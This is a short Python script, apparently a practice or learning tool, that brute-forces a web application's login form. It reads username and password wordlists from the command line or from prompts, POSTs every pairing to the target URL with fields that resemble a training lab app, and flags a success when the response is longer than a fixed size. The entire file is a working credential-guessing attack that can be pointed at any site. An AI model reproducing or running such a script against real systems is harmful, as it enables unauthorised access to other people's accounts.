#!/usr/bin/env python3

# importing the sys module so that we can
# use command line arguments for targetURL
import sys

# importing requests library to contact targetURL
import requests

# Banner
print("""
	--------------------------------
	|    Web App Brute Force Tool   |
	--------------------------------""") #Removed newline for better formatting


if len(sys.argv) == 7 : # Must have all 7 positional arguments
	# Checking first arg
	match sys.argv[1]:
		case '-u':
			targetURL = sys.argv[2]
		case '-l':
			loginNamesFile = sys.argv[2]
		case '-w':
			passwordsFile = sys.argv[2]
		case _:
			print('')
			print('-----------------------------------------------')
			print(f'[!] Invalid Option {sys.argv[1]} {sys.argv[2]}')
			print('-----------------------------------------------')
			print('')
	# Checking third arg
	match sys.argv[3]:
		case '-u':
			targetURL = sys.argv[4]
		case '-l':
			loginNamesFile = sys.argv[4]
		case '-w':
			passwordsFile = sys.argv[4]
		case _:
			print('')
			print('-----------------------------------------------')
			print(f'[!] Invalid Option {sys.argv[3]} {sys.argv[4]}')
			print('-----------------------------------------------')
			print('')
	# Checking fifth option
	match sys.argv[5]:
		case '-u':
			targetURL = sys.argv[6]
		case '-l':
			loginNamesFile = sys.argv[6]
		case '-w':
			passwordsFile = sys.argv[6]
		case _:
			print('')
			print('-----------------------------------------------')
			print(f'[!] Invalid Option {sys.argv[5]} {sys.argv[6]}')
			print('-----------------------------------------------')
			print('')
			sys.exit() # Added to avoid undeclared 'NameError' errors
else:
	targetURL = input("[>] Enter Target URL: ")
	loginNamesFile = input("[>] Enter Login Names File: ")
	passwordsFile = input("[>] Enter Password File: ")

print(f"""
-----------------------------------------------
[*] Target URL: \033[42m{targetURL}\33[0m
[*] Login File: \033[44m{loginNamesFile}\33[0m
[*] Pass File:  \033[44m{passwordsFile}\33[0m
-----------------------------------------------
""")

# Opening loginNamesFile and passwordsFile
with open(loginNamesFile, encoding="utf-8") as LNF:
	loginNames = LNF.readlines()
with open(passwordsFile, encoding="utf-8") as PWF:
	passwords = PWF.readlines()

try:
	for name in loginNames:
		n = name.strip()
		# Only printing Usernames now for brevity in output
		print(f'[*] Trying Login for User: {n}')
		for word in passwords:
			w = word.strip()
			# POST Data = login=admin&password=123456789&security_level=0&form=submit
			r = requests.post(targetURL, data={'login': n, 'password': w, 'security_level': '0', 'form': 'submit'})
			if len(r.text) > 4086:
				# Adding a little spice to our success output
				print(f"[!] SUCCESS!!! \033[41m{n}:{w}\033[0m")
				break

except:
	print("-----------------------------------------------")
	print("[!] Usage: ./brute-force.py -u https://target -l login.txt -w words.txt")
	print("[!] OR just run ./brute-force.py to be prompted")
	print("-----------------------------------------------")
